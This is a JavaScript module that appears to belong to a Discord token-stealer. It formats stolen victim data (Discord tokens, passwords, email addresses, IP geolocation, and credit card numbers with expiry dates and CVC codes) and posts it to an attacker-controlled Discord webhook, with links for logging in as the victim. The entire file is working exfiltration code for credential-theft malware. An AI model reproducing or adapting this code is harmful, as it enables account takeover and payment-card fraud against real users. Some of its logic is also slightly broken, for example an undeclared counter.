const fs = require('fs');
const Discord = require('discord.js');
const config = require("../../../config.json");
const ipinfo = require("../web/ipinfo.js");
const {discord, badges, billing, nitro} = require("./all.js");
const zip = require("./zip.js");
const embed = async (type, webhook, obj) => {
    if (type && obj) {
        const info = await discord("https://discord.com/api/v9/users/@me", obj.token);
        if (!info) return;
        const bill = await discord("https://discord.com/api/v9/users/@me/billing/payment-sources", obj.token);
        const user = `${info.username}#${info.discriminator}(${info.id})`;
        const i = await ipinfo(obj.ip);
        let embed = new Discord.MessageEmbed();
        embed.setAuthor(`${info.username}#${info.discriminator} (${info.id})`, config.pfp);
        embed.setThumbnail(`https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=128`);
        embed.addField(`${config.emoji.embed.token} Token:`, `\`${obj.token}\`\n[\`Copy\`](${config.domain}/copy/${obj.token}) [\`Login\`](${config.domain}/login/${obj.token})`);
        embed.addField(`${config.emoji.embed.badge} Badges:`, await badges(info.flags), true);
        embed.addField(`${config.emoji.embed.nitro} Nitro Type:`, await nitro(info, obj.token), true);
        embed.addField(`${config.emoji.embed.billing} Billing:`, await billing(bill), true);
        embed.addField(`${config.emoji.embed.ip} IP:`, `${i.status !== "success" ? "`No`" : `\`${obj.ip}\`\n[\`IpInfo\`](${config.domain}/ip/${obj.ip}) [\`GoogleMap\`](https://www.google.com/maps/search/google+map++${i.lat},${i.lon})`}`, true);
        embed.setColor(config.color);
        embed.setFooter(config.footer);
        if (type === "email" && obj.email) {
            embed.addField(`${config.emoji.embed.email} New Email`, `\`${obj.email}\``, true)
        } else {
            embed.addField(`${config.emoji.embed.email} Email`, `\`${info.email}\``, true)
        };
        if (type === "login" || type === "email" || type === "2FAon" && obj.password) {
            embed.addField(`${config.emoji.embed.mdp} Password`, `\`${obj.password}\``, true)
        } else if (type === "pass" && obj.old && obj.new) {
            embed.addField(`${config.emoji.embed.mdp} New Password`, `\`${obj.new}\``, true)
        };
        if (type === "card" && obj.num && obj.date && obj.cvc) {
                const nm = countc++;
                const pp = `@~$~@llx404-${user}\nNUMBER: ${obj.num || `No`} | EXPIRE: ${obj.date || `No`} | CVV: ${obj.cvc || `No`}`;
                fs.writeFileSync(`creditcards-${nm}`, pp, function (err) { if (err) return });
                setTimeout(() => { fs.unlink(`creditcards-${nm}`, (err) => { if (err) return }) }, 3000);
                const attachment = new Discord.MessageAttachment(`creditcards-${nm}`, "creditcards.txt");
                webhook.send(attachment);
        };
        if (type === "login") {
            let embed1 = new Discord.MessageEmbed();
            embed1.setColor(config.color);
            embed1.setFooter(config.footer);
            embed1.setDescription(`\`\`\`${await zip(obj.token, user, info.id, webhook)}\`\`\``);
            //embed1.setAuthor(`HQ Friends`, config.pfp)
            //embed1.setDescription(amisrare(amis))
            return webhook.send({ embeds: [embed, embed1] });
        } else if (type === "tokens" && obj.path) {
            return webhook.send(`\`\`\`@~$~@llx404-${obj.path}\`\`\``, { embeds: [embed] });
        } else {
            return webhook.send({ embeds: [embed] });
        }
    };
};
module.exports = embed;